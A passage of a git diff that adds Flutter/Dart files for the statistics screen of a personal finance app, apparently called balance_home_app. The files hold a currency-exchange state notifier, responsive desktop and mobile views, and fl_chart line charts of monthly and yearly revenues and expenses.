a\/frontend\/flutter\/lib\/src\/features\/statistics\/logic\/providers\/selected_exchange\/selected_exchange_model_state_notifier.dart b\/frontend\/flutter\/lib\/src\/features\/statistics\/logic\/providers\/selected_exchange\/selected_exchange_model_state_notifier.dart\nnew file mode 100644\nindex 0000000..5ea8c59\n--- \/dev\/null\n+++ b\/frontend\/flutter\/lib\/src\/features\/statistics\/logic\/providers\/selected_exchange\/selected_exchange_model_state_notifier.dart\n@@ -0,0 +1,38 @@\n+import 'package:balance_home_app\/src\/features\/statistics\/data\/models\/selected_exchange_model.dart';\n+import 'package:balance_home_app\/src\/features\/statistics\/logic\/providers\/selected_exchange\/selected_exchange_model_state.dart';\n+import 'package:flutter_riverpod\/flutter_riverpod.dart';\n+\n+class SelectedExchangeModelStateNotifier extends StateNotifier<SelectedExchangeModelState> {\n+  SelectedExchangeModelStateNotifier() : \n+    super(\n+      const SelectedExchangeModelState(\n+        SelectedExchangeModel(\n+          selectedCoinFrom: \"EUR\", \n+          selectedCoinTo: \"USD\"\n+        )\n+      ));\n+  \n+  void setSelectedExchangeModel(SelectedExchangeModel model) {\n+    state = state.copyWith(model: model);\n+  }\n+  \n+  void setSelectedCoinFrom(String selectedCoinFrom) {\n+    SelectedExchangeModel model = SelectedExchangeModel(\n+      selectedCoinFrom: selectedCoinFrom,\n+      selectedCoinTo: state.model.selectedCoinTo\n+    ); \n+    state = state.copyWith(model: model);\n+  }\n+  \n+  void setSelectedCoinTo(String selectedCoinTo) {\n+    SelectedExchangeModel model = SelectedExchangeModel(\n+      selectedCoinFrom: state.model.selectedCoinFrom,\n+      selectedCoinTo: selectedCoinTo\n+    ); \n+    state = state.copyWith(model: model);\n+  }\n+  \n+  SelectedExchangeModel? getSelectedExchangeModel() {\n+    return state.model;\n+  }\n+}\n\\ No newline at end of file\ndiff --git a\/frontend\/flutter\/lib\/src\/features\/statistics\/presentation\/views\/statistics_view.dart b\/frontend\/flutter\/lib\/src\/features\/statistics\/presentation\/views\/statistics_view.dart\nnew file mode 100644\nindex 0000000..f2e35b5\n--- \/dev\/null\n+++ b\/frontend\/flutter\/lib\/src\/features\/statistics\/presentation\/views\/statistics_view.dart\n@@ -0,0 +1,137 @@\n+import 'package:balance_home_app\/src\/core\/widgets\/future_widget.dart';\n+import 'package:balance_home_app\/src\/core\/widgets\/responsive_layout.dart';\n+import 'package:balance_home_app\/src\/features\/coin\/data\/repositories\/coin_type_repository.dart';\n+import 'package:balance_home_app\/src\/features\/coin\/data\/repositories\/exchange_repository.dart';\n+import 'package:balance_home_app\/src\/features\/coin\/logic\/providers\/coin_provider.dart';\n+import 'package:balance_home_app\/src\/features\/coin\/logic\/providers\/exchange_provider.dart';\n+import 'package:balance_home_app\/src\/features\/expense\/data\/repositories\/expense_repository.dart';\n+import 'package:balance_home_app\/src\/features\/expense\/logic\/providers\/expense_provider.dart';\n+import 'package:balance_home_app\/src\/features\/revenue\/data\/repositories\/revenue_repository.dart';\n+import 'package:balance_home_app\/src\/features\/revenue\/logic\/providers\/revenue_provider.dart';\n+import 'package:balance_home_app\/src\/features\/statistics\/data\/models\/selected_date_model.dart';\n+import 'package:balance_home_app\/src\/features\/statistics\/data\/models\/statistics_data_model.dart';\n+import 'package:balance_home_app\/src\/features\/statistics\/data\/repositories\/annual_balance_repository.dart';\n+import 'package:balance_home_app\/src\/features\/statistics\/data\/repositories\/monthly_balance_repository.dart';\n+import 'package:balance_home_app\/src\/features\/statistics\/logic\/providers\/annual_balance_provider.dart';\n+import 'package:balance_home_app\/src\/features\/statistics\/logic\/providers\/monthly_balance_provider.dart';\n+import 'package:balance_home_app\/src\/features\/statistics\/logic\/providers\/selected_date\/selected_date_model_provider.dart';\n+import 'package:balance_home_app\/src\/features\/statistics\/logic\/providers\/selected_exchange\/selected_exchange_model_provider.dart';\n+import 'package:balance_home_app\/src\/features\/statistics\/presentation\/views\/statistics_view_desktop.dart';\n+import 'package:balance_home_app\/src\/features\/statistics\/presentation\/views\/statistics_view_mobile.dart';\n+import 'package:flutter\/material.dart';\n+import 'package:flutter_riverpod\/flutter_riverpod.dart';\n+\n+\/\/ ignore: must_be_immutable\n+class StatisticsView extends ConsumerWidget {\n+  StatisticsDataModel? statisticsData;\n+\n+  StatisticsView({super.key});\n+\n+  @override\n+  Widget build(BuildContext context, WidgetRef ref) {\n+    final selectedBalanceDate = ref.watch(selectedBalanceDateStateNotifierProvider).model;\n+    final selectedSavingsDate = ref.watch(selectedSavingsDateStateNotifierProvider).model;\n+    final expenseRepository = ref.read(expenseRepositoryProvider);\n+    final revenueRepository = ref.read(revenueRepositoryProvider);\n+    final monthlyBalanceRepository = ref.read(monthlyBalanceRepositoryProvider);\n+    final annualBalanceRepository = ref.read(annualBalanceRepositoryProvider);\n+    final coinTypeRepository = ref.read(coinTypeRepositoryProvider);\n+    final exchangeRepository = ref.read(exchangeRepositoryProvider);\n+    final selectedExchange = ref.watch(selectedExchangeStateNotifierProvider).model;\n+    return FutureWidget<StatisticsDataModel>(\n+      childCreation: (StatisticsDataModel data) {\n+        return SingleChildScrollView(\n+          child: ResponsiveLayout(\n+            desktopChild: StatisticsViewDesktop(statisticsData: data),\n+            mobileChild: StatisticsViewMobile(statisticsData: data),\n+            tabletChild: StatisticsViewMobile(statisticsData: data),\n+          )\n+        );\n+      },\n+      future: getStatisticData(\n+        revenueRepository,\n+        expenseRepository,\n+        monthlyBalanceRepository,\n+        annualBalanceRepository,\n+        coinTypeRepository,\n+        selectedBalanceDate,\n+        selectedSavingsDate,\n+        exchangeRepository,\n+        selectedExchange.selectedCoinFrom,\n+        selectedExchange.selectedCoinTo\n+      ),\n+    );\n+  }\n+\n+  \/\/\/ Get all data for statistics page\n+  @visibleForTesting\n+  Future<StatisticsDataModel> getStatisticData(\n+    IRevenueRepository revenueRepository,\n+    IExpenseRepository expenseRepository,\n+    IMonthlyBalanceRepository monthlyBalanceRepository,\n+    IAnnualBalanceRepository annualBalanceRepository,\n+    ICoinTypeRepository coinTypeRepositoryProvider,\n+    SelectedDateModel selectedBalanceDate,\n+    SelectedDateModel savingsSelectedDate,\n+    IExchangeRepository exchangeRepository,\n+    String selectedCoinFrom,\n+    String selectedCoinTo\n+  ) async {\n+    DateTime dateFrom = DateTime(\n+      selectedBalanceDate.year,\n+      1,\n+      1\n+    );\n+    DateTime dateTo = DateTime(\n+      selectedBalanceDate.year,\n+      12,\n+      DateUtils.getDaysInMonth(\n+        selectedBalanceDate.year, 12)\n+    );\n+    if (statisticsData == null) {\n+      statisticsData = StatisticsDataModel(\n+        expenses: await expenseRepository.getExpenses(\n+          dateFrom: dateFrom,\n+          dateTo: dateTo\n+        ),\n+        revenues: await revenueRepository.getRevenues(\n+          dateFrom: dateFrom,\n+          dateTo: dateTo\n+        ),\n+        expenseYears: await expenseRepository.getExpenseYears(),\n+        revenueYears: await revenueRepository.getRevenueYears(),\n+        monthlyBalances: await monthlyBalanceRepository.getMonthlyBalances(\n+          year: savingsSelectedDate.year\n+        ),\n+        annualBalances: await annualBalanceRepository.getLastEightYearsAnnualBalances(),\n+        selectedBalanceDate: selectedBalanceDate,\n+        savingsSelectedDate: savingsSelectedDate,\n+        dateExchangesModel: await exchangeRepository.getLastDateExchanges(days: 20),\n+        selectedCoinFrom: selectedCoinFrom,\n+        selectedCoinTo: selectedCoinTo,\n+        coinTypes: await coinTypeRepositoryProvider.getCoinTypes()\n+      );\n+    } else {\n+      if(selectedBalanceDate != statisticsData!.selectedBalanceDate) {\n+        statisticsData!.expenses = await expenseRepository.getExpenses(\n+          dateFrom: dateFrom,\n+          dateTo: dateTo\n+        );\n+        statisticsData!.revenues = await revenueRepository.getRevenues(\n+          dateFrom: dateFrom,\n+          dateTo: dateTo\n+        );\n+        statisticsData!.selectedBalanceDate = selectedBalanceDate;\n+      }\n+      if(savingsSelectedDate != statisticsData!.savingsSelectedDate) {\n+        statisticsData!.monthlyBalances = await monthlyBalanceRepository.getMonthlyBalances(\n+          year: savingsSelectedDate.year\n+        );\n+        statisticsData!.savingsSelectedDate = savingsSelectedDate;\n+      }\n+      statisticsData!.selectedCoinFrom = selectedCoinFrom;\n+      statisticsData!.selectedCoinTo = selectedCoinTo;\n+    }\n+    return statisticsData!;\n+  }\n+}\n\\ No newline at end of file\ndiff --git a\/frontend\/flutter\/lib\/src\/features\/statistics\/presentation\/views\/statistics_view_desktop.dart b\/frontend\/flutter\/lib\/src\/features\/statistics\/presentation\/views\/statistics_view_desktop.dart\nnew file mode 100644\nindex 0000000..411f36f\n--- \/dev\/null\n+++ b\/frontend\/flutter\/lib\/src\/features\/statistics\/presentation\/views\/statistics_view_desktop.dart\n@@ -0,0 +1,60 @@\n+import 'package:balance_home_app\/src\/features\/statistics\/data\/models\/statistics_data_model.dart';\n+import 'package:balance_home_app\/src\/features\/statistics\/presentation\/widgets\/balance\/balance_month_chart_container.dart';\n+import 'package:balance_home_app\/src\/features\/statistics\/presentation\/widgets\/balance\/balance_year_chart_container.dart';\n+import 'package:balance_home_app\/src\/features\/statistics\/presentation\/widgets\/currency\/currency_chart_container.dart';\n+import 'package:balance_home_app\/src\/features\/statistics\/presentation\/widgets\/savings\/savings_eight_years_chart_container.dart';\n+import 'package:balance_home_app\/src\/features\/statistics\/presentation\/widgets\/savings\/savings_year_chart_container.dart';\n+import 'package:flutter\/material.dart';\n+\n+class StatisticsViewDesktop extends StatelessWidget {\n+  final StatisticsDataModel statisticsData;\n+  \n+  const StatisticsViewDesktop({\n+    required this.statisticsData,\n+    super.key\n+  });\n+\n+  @override\n+  Widget build(BuildContext context) {\n+    return SingleChildScrollView(\n+      child: Column(\n+        children: [\n+          Container(\n+            color: const Color.fromARGB(254, 254, 252, 224),\n+            foregroundDecoration: borderDecoration(),\n+            child: Row(\n+              mainAxisAlignment: MainAxisAlignment.center,\n+              children: [\n+                BalanceMonthChartContainer(statisticsData: statisticsData),\n+                BalanceYearChartContainer(statisticsData: statisticsData),\n+              ],\n+            ),\n+          ),\n+          Container(\n+            color: const Color.fromARGB(254, 254, 252, 224),\n+            foregroundDecoration: borderDecoration(),\n+            child: Row(\n+              mainAxisAlignment: MainAxisAlignment.center,\n+              children: [\n+                SavingsYearChartContainer(statisticsData: statisticsData),\n+                SavingsEightYearsChartContainer(statisticsData: statisticsData)\n+              ],\n+            ),\n+          ),\n+          Container(\n+            color: const Color.fromARGB(254, 201, 241, 253),\n+            foregroundDecoration: borderDecoration(),\n+            child: CurrencyChartContainer(statisticsData: statisticsData)\n+          ),\n+        ],\n+      ),\n+    );\n+  }\n+\n+  @visibleForTesting\n+  BoxDecoration borderDecoration() {\n+    return BoxDecoration(\n+      border: Border.all(),\n+    );\n+  }\n+}\n\\ No newline at end of file\ndiff --git a\/frontend\/flutter\/lib\/src\/features\/statistics\/presentation\/views\/statistics_view_mobile.dart b\/frontend\/flutter\/lib\/src\/features\/statistics\/presentation\/views\/statistics_view_mobile.dart\nnew file mode 100644\nindex 0000000..be2d6b4\n--- \/dev\/null\n+++ b\/frontend\/flutter\/lib\/src\/features\/statistics\/presentation\/views\/statistics_view_mobile.dart\n@@ -0,0 +1,34 @@\n+import 'package:balance_home_app\/src\/features\/statistics\/data\/models\/statistics_data_model.dart';\n+import 'package:balance_home_app\/src\/features\/statistics\/presentation\/widgets\/balance\/balance_month_chart_container.dart';\n+import 'package:balance_home_app\/src\/features\/statistics\/presentation\/widgets\/balance\/balance_year_chart_container.dart';\n+import 'package:flutter\/material.dart';\n+\n+class StatisticsViewMobile extends StatelessWidget {\n+  final StatisticsDataModel statisticsData;\n+\n+  const StatisticsViewMobile({\n+    required this.statisticsData,\n+    super.key\n+  });\n+\n+  @override\n+  Widget build(BuildContext context) {\n+    return SingleChildScrollView(\n+      child: Container(\n+        color: const Color.fromARGB(254, 254, 252, 224),\n+        child: Column(\n+          children: [\n+            BalanceMonthChartContainer(statisticsData: statisticsData),\n+            BalanceYearChartContainer(statisticsData: statisticsData),\n+          ],\n+        ),\n+      ),\n+    );\n+  }\n+\n+  BoxDecoration borderDecoration() {\n+    return BoxDecoration(\n+      border: Border.all(),\n+    );\n+  }\n+}\n\\ No newline at end of file\ndiff --git a\/frontend\/flutter\/lib\/src\/features\/statistics\/presentation\/widgets\/balance\/balance_month_chart_container.dart b\/frontend\/flutter\/lib\/src\/features\/statistics\/presentation\/widgets\/balance\/balance_month_chart_container.dart\nnew file mode 100644\nindex 0000000..3064db8\n--- \/dev\/null\n+++ b\/frontend\/flutter\/lib\/src\/features\/statistics\/presentation\/widgets\/balance\/balance_month_chart_container.dart\n@@ -0,0 +1,113 @@\n+\n+import 'package:balance_home_app\/src\/core\/providers\/localization_provider.dart';\n+import 'package:balance_home_app\/src\/core\/services\/platform_service.dart';\n+import 'package:balance_home_app\/src\/core\/utils\/date_util.dart';\n+import 'package:balance_home_app\/src\/features\/expense\/data\/models\/expense_model.dart';\n+import 'package:balance_home_app\/src\/features\/revenue\/data\/models\/revenue_model.dart';\n+import 'package:balance_home_app\/src\/features\/statistics\/data\/models\/selected_date_model.dart';\n+import 'package:balance_home_app\/src\/features\/statistics\/data\/models\/statistics_data_model.dart';\n+import 'package:balance_home_app\/src\/features\/statistics\/logic\/providers\/selected_date\/selected_date_model_provider.dart';\n+import 'package:balance_home_app\/src\/features\/statistics\/logic\/providers\/selected_date\/selected_date_model_state_notifier.dart';\n+import 'package:balance_home_app\/src\/features\/statistics\/presentation\/widgets\/balance\/balance_month_line_chart.dart';\n+import 'package:flutter\/material.dart';\n+import 'package:flutter_riverpod\/flutter_riverpod.dart';\n+\n+class BalanceMonthChartContainer extends ConsumerWidget {\n+  final StatisticsDataModel statisticsData;\n+\n+  const BalanceMonthChartContainer({\n+    required this.statisticsData,\n+    super.key\n+  });\n+\n+  @override\n+  Widget build(BuildContext context, WidgetRef ref) {\n+    final appLocalizations = ref.watch(localizationStateNotifierProvider).localization;\n+    SelectedDateModel selectedBalanceDate = ref.watch(selectedBalanceDateStateNotifierProvider).model;\n+    SelectedDateModelStateNotifier selectedBalanceDateNotifier = ref.read(selectedBalanceDateStateNotifierProvider.notifier);\n+    \/\/ Month names list\n+    List<String> months = DateUtil.getMonthList(appLocalizations);\n+    String selectedMonth = DateUtil.monthNumToString(\n+      selectedBalanceDate.month, appLocalizations);\n+    \/\/ Screen sizes:\n+    double screenHeight = MediaQuery.of(context).size.height;\n+    double screenWidth = MediaQuery.of(context).size.width;\n+    double chartLineHeight = (screenHeight * 0.45 <= 200) ? \n+      200 : (screenHeight * 0.45 <= 350) ? screenHeight * 0.45 : 350;\n+    return Column(\n+      children: [\n+        Row(\n+          mainAxisAlignment: MainAxisAlignment.center,\n+          children: [\n+            Container(\n+              margin: const EdgeInsets.only(top: 20, bottom: 10),\n+              color: const Color.fromARGB(255, 114, 187, 83),\n+              height: 45,\n+              width: (PlatformService().isSmallWindow(context)) ? \n+                screenWidth * 0.80 : screenWidth * 0.35,\n+              child: Center(\n+                child: Text(\n+                  style: const TextStyle(\n+                    color: Colors.white,\n+                    fontSize: 18,\n+                    fontWeight: FontWeight.bold\n+                  ),\n+                  \"${appLocalizations.balanceChartTitle} $selectedMonth\"\n+                )\n+              ),\n+            ),\n+            Container(\n+              margin: const EdgeInsets.only(top: 20, bottom: 10),\n+              color: const Color.fromARGB(255, 195, 187, 56),\n+              padding: const EdgeInsets.only(left: 10, right: 10),\n+              height: 45,\n+              child: DropdownButton<String>(\n+                value: selectedMonth,\n+                items: months.map(\n+                  (month) {\n+                    return DropdownMenuItem<String>(\n+                      value: month,\n+                      child: Text(month),\n+                    );\n+                  }\n+                ).toList(),\n+                onChanged: (month) {\n+                  selectedBalanceDateNotifier.setMonth(\n+                    DateUtil.monthStringToNum(month!, appLocalizations)\n+                  );\n+                }\n+              ),\n+            )\n+          ],\n+        ),\n+        SizedBox(\n+          height: chartLineHeight,\n+          width: (PlatformService().isSmallWindow(context)) ? \n+            screenWidth * 0.95 : screenWidth * 0.45,\n+          child: BalanceMonthLineChart(\n+            selectedMonth: DateUtil.monthStringToNum(selectedMonth, appLocalizations),\n+            selectedYear: selectedBalanceDate.year,\n+            expenses: getExpenses(selectedBalanceDate.month),\n+            revenues: getRevenues(selectedBalanceDate.month)\n+          )\n+        ),\n+      ],\n+    );\n+  }\n+\n+  List<ExpenseModel> getExpenses(int month) {\n+    List<ExpenseModel> expenses = [];\n+    for (ExpenseModel expense in statisticsData.expenses) {\n+      if (expense.date.month == month) expenses.add(expense);\n+    }\n+    return expenses;\n+  }\n+  \n+  List<RevenueModel> getRevenues(int month) {\n+    List<RevenueModel> revenues = [];\n+    for (RevenueModel revenue in statisticsData.revenues) {\n+      if (revenue.date.month == month) revenues.add(revenue);\n+    }\n+    return revenues;\n+  }\n+}\n\\ No newline at end of file\ndiff --git a\/frontend\/flutter\/lib\/src\/features\/statistics\/presentation\/widgets\/balance\/balance_month_line_chart.dart b\/frontend\/flutter\/lib\/src\/features\/statistics\/presentation\/widgets\/balance\/balance_month_line_chart.dart\nnew file mode 100644\nindex 0000000..356c5fe\n--- \/dev\/null\n+++ b\/frontend\/flutter\/lib\/src\/features\/statistics\/presentation\/widgets\/balance\/balance_month_line_chart.dart\n@@ -0,0 +1,213 @@\n+import 'dart:math';\n+\n+import 'package:balance_home_app\/src\/features\/expense\/data\/models\/expense_model.dart';\n+import 'package:balance_home_app\/src\/features\/revenue\/data\/models\/revenue_model.dart';\n+import 'package:fl_chart\/fl_chart.dart';\n+import 'package:flutter\/material.dart';\n+\n+class BalanceMonthLineChart extends StatelessWidget {\n+\n+  \/\/\/ Border chart lines decoration \n+  FlBorderData get borderData => FlBorderData(\n+    show: true,\n+    border: const Border(\n+      bottom: BorderSide(color: Colors.black, width: 2),\n+      left: BorderSide(color: Colors.black, width: 2),\n+      right: BorderSide(color: Colors.transparent),\n+      top: BorderSide(color: Colors.transparent),\n+    ),\n+  );\n+\n+  SideTitles get bottomTitles => SideTitles(\n+    showTitles: true,\n+    reservedSize: 22,\n+    interval: 1,\n+    getTitlesWidget: (double value, TitleMeta meta) {\n+      const style = TextStyle(\n+        color: Colors.black,\n+        fontSize: 12,\n+      );\n+      return SideTitleWidget(\n+        axisSide: meta.axisSide,\n+        space: 5,\n+        child: Text('$value', style: style),\n+      );\n+    },\n+  );\n+\n+  SideTitles get leftTitles => SideTitles(\n+    getTitlesWidget: (double value, TitleMeta meta) {\n+      const style = TextStyle(\n+        color: Color(0xff75729e),\n+        fontWeight: FontWeight.bold,\n+        fontSize: 14,\n+      );\n+      return Text(\"$value\", style: style, textAlign: TextAlign.center);\n+    },\n+    showTitles: true,\n+    interval: (getMaxQuantity() \/ 5).ceilToDouble(),\n+    reservedSize: 40,\n+  );\n+\n+  \/\/\/ Border chart side tittles setup\n+  FlTitlesData get titlesData => FlTitlesData(\n+    bottomTitles: AxisTitles(\n+      sideTitles: bottomTitles,\n+    ),\n+    \/\/ Ignore right details\n+    rightTitles: AxisTitles(\n+      sideTitles: SideTitles(showTitles: false),\n+    ),\n+    \/\/ Ignore top details\n+    topTitles: AxisTitles(\n+      sideTitles: SideTitles(showTitles: false),\n+    ),\n+    leftTitles: AxisTitles(\n+      sideTitles: leftTitles,\n+    ),\n+  );\n+\n+  List<LineChartBarData> get lineBarsData => [\n+    revenueChartBarData(),\n+    expenseChartBarData(),\n+  ];\n+\n+  final int selectedMonth;\n+  final int selectedYear;\n+  final List<RevenueModel> revenues;\n+  final List<ExpenseModel> expenses;\n+  \n+  const BalanceMonthLineChart({\n+    required this.selectedMonth,\n+    required this.selectedYear,\n+    required this.revenues,\n+    required this.expenses,\n+    super.key\n+  });\n+\n+  @override\n+  Widget build(BuildContext context) {\n+    int days = DateUtils.getDaysInMonth(selectedYear, selectedMonth);\n+    return Padding(\n+      padding: const EdgeInsets.all(15),\n+      child: LineChart(\n+        LineChartData(\n+          gridData: FlGridData(show: true),\n+          titlesData: titlesData,\n+          borderData: borderData,\n+          lineBarsData: lineBarsData,\n+          minX: 1,\n+          maxX: days.toDouble(),\n+          maxY: getMaxQuantity(),\n+          minY: 0,\n+        ),\n+        swapAnimationDuration: const Duration(milliseconds: 250),\n+      ),\n+    );\n+  }\n+\n+  @visibleForTesting\n+  LineChartBarData revenueChartBarData() {\n+    int days = DateUtils.getDaysInMonth(selectedYear, selectedMonth);\n+    \/\/ Dictionary with days and revenue quantities per day\n+    Map<int, double> spotsMap = {};\n+    for (RevenueModel revenue in revenues) {\n+      if (spotsMap.containsKey(revenue.date.day)) {\n+        spotsMap[revenue.date.day] = spotsMap[revenue.date.day]! + revenue.quantity;\n+      } else {\n+        spotsMap[revenue.date.day] = revenue.quantity;\n+      }\n+    }\n+    \/\/ Check unexistant days\n+    for (int day = 1; day <= days; day++) {\n+      if (!spotsMap.containsKey(day)) {\n+        spotsMap[day] = 0.0;\n+      }\n+    }\n+    \/\/ Data conversion\n+    List<FlSpot> spots = [];\n+    for (int day in spotsMap.keys.toList()..sort()) {\n+      spots.add(FlSpot(day.toDouble(), spotsMap[day]!.toDouble()));\n+    }\n+    return LineChartBarData(\n+      isCurved: true,\n+      preventCurveOverShooting: true,\n+      color: const Color.fromARGB(184, 0, 175, 15),\n+      barWidth: 2,\n+      isStrokeCapRound: true,\n+      dotData: FlDotData(show: false),\n+      belowBarData: BarAreaData(\n+        show: true,\n+        color: const Color.fromARGB(55, 0, 175, 15),\n+      ),\n+      spots: spots\n+    );\n+  }\n+\n+  @visibleForTesting\n+  LineChartBarData expenseChartBarData() { \n+    int days = DateUtils.getDaysInMonth(selectedYear, selectedMonth);\n+    \/\/ Dictionary with days and expense quantities per day\n+    Map<int, double> spotsMap = {};\n+    for (ExpenseModel expense in expenses) {\n+      if (spotsMap.containsKey(expense.date.day)) {\n+        spotsMap[expense.date.day] = spotsMap[expense.date.day]! + expense.quantity;\n+      } else {\n+        spotsMap[expense.date.day] = expense.quantity;\n+      }\n+    }\n+    \/\/ Check unexistant days\n+    for (int day = 1; day <= days; day++) {\n+      if (!spotsMap.containsKey(day)) {\n+        spotsMap[day] = 0.0;\n+      }\n+    }\n+    \/\/ Data conversion\n+    List<FlSpot> spots = [];\n+    for (int day in spotsMap.keys.toList()..sort()) {\n+      spots.add(FlSpot(day.toDouble(), spotsMap[day]!.toDouble()));\n+    }\n+    return LineChartBarData(\n+      isCurved: true,\n+      preventCurveOverShooting: true,\n+      color: const Color.fromARGB(188, 255, 17, 0),\n+      barWidth: 2,\n+      isStrokeCapRound: true,\n+      dotData: FlDotData(show: false),\n+      belowBarData: BarAreaData(\n+        show: true,\n+        color: const Color.fromARGB(55, 212, 117, 117),\n+      ),\n+      spots: spots\n+    );\n+  }\n+\n+  @visibleForTesting\n+  double getMaxQuantity() {\n+    double quantity = 4.0;\n+    Map<int, double> quantityMap = {};\n+    for (RevenueModel revenue in revenues) {\n+      if (quantityMap.containsKey(revenue.date.day)) {\n+        quantityMap[revenue.date.day] = quantityMap[revenue.date.day]! + revenue.quantity;\n+      } else {\n+        quantityMap[revenue.date.day] = revenue.quantity;\n+      }\n+    }\n+    if (revenues.isNotEmpty) {\n+      quantity = quantityMap.values.reduce(max);\n+    }\n+    quantityMap = {};\n+    for (ExpenseModel expense in expenses) {\n+      if (quantityMap.containsKey(expense.date.day)) {\n+        quantityMap[expense.date.day] = quantityMap[expense.date.day]! + expense.quantity;\n+      } else {\n+        quantityMap[expense.date.day] = expense.quantity;\n+      }\n+    }\n+    if (expenses.isNotEmpty && quantity < quantityMap.values.reduce(max)) {\n+      quantity = quantityMap.values.reduce(max);\n+    }\n+    if (quantity < 4) quantity = 4;\n+    return quantity.ceilToDouble();\n+  }\n+}\n\\ No newline at end of file\ndiff --git a\/frontend\/flutter\/lib\/src\/features\/statistics\/presentation\/widgets\/balance\/balance_year_chart_container.dart b\/frontend\/flutter\/lib\/src\/features\/statistics\/presentation\/widgets\/balance\/balance_year_chart_container.dart\nnew file mode 100644\nindex 0000000..1681012\n--- \/dev\/null\n+++ b\/frontend\/flutter\/lib\/src\/features\/statistics\/presentation\/widgets\/balance\/balance_year_chart_container.dart\n@@ -0,0 +1,98 @@\n+\n+import 'package:balance_home_app\/src\/core\/providers\/localization_provider.dart';\n+import 'package:balance_home_app\/src\/core\/services\/platform_service.dart';\n+import 'package:balance_home_app\/src\/core\/utils\/date_util.dart';\n+import 'package:balance_home_app\/src\/features\/statistics\/data\/models\/selected_date_model.dart';\n+import 'package:balance_home_app\/src\/features\/statistics\/data\/models\/statistics_data_model.dart';\n+import 'package:balance_home_app\/src\/features\/statistics\/logic\/providers\/selected_date\/selected_date_model_provider.dart';\n+import 'package:balance_home_app\/src\/features\/statistics\/logic\/providers\/selected_date\/selected_date_model_state_notifier.dart';\n+import 'package:balance_home_app\/src\/features\/statistics\/presentation\/widgets\/balance\/balance_year_line_chart.dart';\n+import 'package:flutter\/material.dart';\n+import 'package:flutter_riverpod\/flutter_riverpod.dart';\n+\n+class BalanceYearChartContainer extends ConsumerWidget {\n+  final StatisticsDataModel statisticsData;\n+\n+  const BalanceYearChartContainer({\n+    required this.statisticsData,\n+    super.key\n+  });\n+  \n+  @override\n+  Widget build(BuildContext context, WidgetRef ref) {\n+    final appLocalizations = ref.watch(localizationStateNotifierProvider).localization;\n+    SelectedDateModel selectedBalanceDate = ref.watch(selectedBalanceDateStateNotifierProvider).model;\n+    SelectedDateModelStateNotifier selectedBalanceDateNotifier = ref.read(selectedBalanceDateStateNotifierProvider.notifier);\n+    List<int> years = <int>{\n+      ...statisticsData.revenueYears, ...statisticsData.expenseYears\n+    }.toList();\n+    int selectedYear = selectedBalanceDate.year;\n+    \/\/ Month names list\n+    List<String> months = DateUtil.getMonthList(appLocalizations);\n+    \/\/ Adding selected year to years list\n+    if (!years.contains(selectedYear)) years.add(selectedYear);\n+    \/\/ Adding current year to years list\n+    if (!years.contains(DateTime.now().year)) years.add(DateTime.now().year);\n+    \/\/ Screen sizes:\n+    double screenHeight = MediaQuery.of(context).size.height;\n+    double screenWidth = MediaQuery.of(context).size.width;\n+    double chartLineHeight = (screenHeight * 0.45 <= 200) ? \n+      200 : (screenHeight * 0.45 <= 350) ? screenHeight * 0.45 : 350;\n+    return Column(\n+      children: [\n+        Row(\n+          mainAxisAlignment: MainAxisAlignment.center,\n+          children: [\n+            Container(\n+              margin: const EdgeInsets.only(top: 20, bottom: 10),\n+              color: const Color.fromARGB(255, 114, 187, 83),\n+              height: 45,\n+              width: (PlatformService().isSmallWindow(context)) ? \n+                screenWidth * 0.80 : screenWidth * 0.35,\n+              child: Center(\n+                child: Text(\n+                  style: const TextStyle(\n+                    color: Colors.white,\n+                    fontSize: 18,\n+                    fontWeight: FontWeight.bold\n+                  ),\n+                  \"${appLocalizations.balanceChartTitle} $selectedYear\"\n+                )\n+              ),\n+            ),\n+            Container(\n+              margin: const EdgeInsets.only(top: 20, bottom: 10),\n+              color: const Color.fromARGB(255, 195, 187, 56),\n+              padding: const EdgeInsets.only(left: 10, right: 10),\n+              height: 45,\n+              child: DropdownButton<int>(\n+                value: selectedYear,\n+                items: years.map(\n+                  (year) {\n+                    return DropdownMenuItem<int>(\n+                      value: year,\n+                      child: Text(year.toString()),\n+                    );\n+                  }\n+                ).toList(),\n+                onChanged: (year) {\n+                  selectedBalanceDateNotifier.setYear(year!);\n+                }\n+              ),\n+            )\n+          ],\n+        ),\n+        SizedBox(\n+          height: chartLineHeight,\n+          width: (PlatformService().isSmallWindow(context)) ? \n+            screenWidth * 0.95 : screenWidth * 0.45,\n+          child: BalanceYearLineChart(\n+            monthList: months,\n+            revenues: statisticsData.revenues,\n+            expenses: statisticsData.expenses,\n+          )\n+        ),\n+      ],\n+    );\n+  }\n+}\n\\ No newline at end of file\ndiff --git a\/frontend\/flutter\/lib\/src\/features\/statistics\/presentation\/widgets\/balance\/balance_year_line_chart.dart b\/frontend\/flutter\/lib\/src\/features\/statistics\/presentation\/widgets\/balance\/balance_year_line_chart.dart\nnew file mode 100644\nindex 0000000..16961b2\n--- \/dev\/null\n+++ b\/frontend\/flutter\/lib\/src\/features\/statistics\/presentation\/widgets\/balance\/balance_year_line_chart.dart\n@@ -0,0 +1,208 @@\n+import 'dart:math';\n+import 'package:balance_home_app\/src\/features\/expense\/data\/models\/expense_model.dart';\n+import 'package:balance_home_app\/src\/features\/revenue\/data\/models\/revenue_model.dart';\n+import 'package:fl_chart\/fl_chart.dart';\n+import 'package:flutter\/material.dart';\n+\n+class BalanceYearLineChart extends StatelessWidget {\n+  \/\/\/ Border chart lines decoration \n+  FlBorderData get borderData => FlBorderData(\n+    show: true,\n+    border: const Border(\n+      bottom: BorderSide(color: Colors.black, width: 2),\n+      left: BorderSide(color: Colors.black, width: 2),\n+      right: BorderSide(color: Colors.transparent),\n+      top: BorderSide(color: Colors.transparent),\n+    ),\n+  );\n+\n+  SideTitles get bottomTitles => SideTitles(\n+    showTitles: true,\n+    reservedSize: 22,\n+    interval: 1,\n+    getTitlesWidget: (double value, TitleMeta meta) {\n+      const style = TextStyle(\n+        color: Colors.black,\n+        fontSize: 12,\n+      );\n+      String month = monthList[value.toInt()-1];\n+      return SideTitleWidget(\n+        axisSide: meta.axisSide,\n+        space: 5,\n+        child: Text(month, style: style),\n+      );\n+    },\n+  );\n+\n+  SideTitles get leftTitles => SideTitles(\n+    getTitlesWidget: (double value, TitleMeta meta) {\n+      const style = TextStyle(\n+        color: Color(0xff75729e),\n+        fontWeight: FontWeight.bold,\n+        fontSize: 14,\n+      );\n+      return Text(\"$value\", style: style, textAlign: TextAlign.center);\n+    },\n+    showTitles: true,\n+    interval: (getMaxQuantity() \/ 5).ceilToDouble(),\n+    reservedSize: 40,\n+  );\n+\n+  \/\/\/ Border chart side tittles setup\n+  FlTitlesData get 